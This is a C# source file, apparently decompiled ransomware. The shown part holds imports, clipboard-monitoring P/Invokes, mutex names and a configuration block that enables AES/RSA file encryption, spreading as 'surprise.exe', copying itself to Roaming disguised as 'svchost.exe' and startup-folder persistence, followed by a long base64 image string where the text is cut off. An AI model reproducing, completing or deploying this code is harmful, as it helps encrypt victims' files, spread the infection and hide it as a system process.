using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 10;

	private static string base64Image = "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